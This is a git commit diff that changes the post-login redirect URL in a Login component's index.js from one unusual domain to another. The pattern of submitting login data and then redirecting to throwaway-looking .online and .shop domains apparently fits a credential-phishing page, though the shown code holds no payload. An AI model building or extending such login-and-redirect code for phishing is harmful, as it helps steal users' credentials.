d6ed52a92fab70c8c4b341c210466aededd9564f
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-07-15 08:30:46 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://scn.awillynilly.online/';
+      window.location.href = 'https://runupangatpop.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
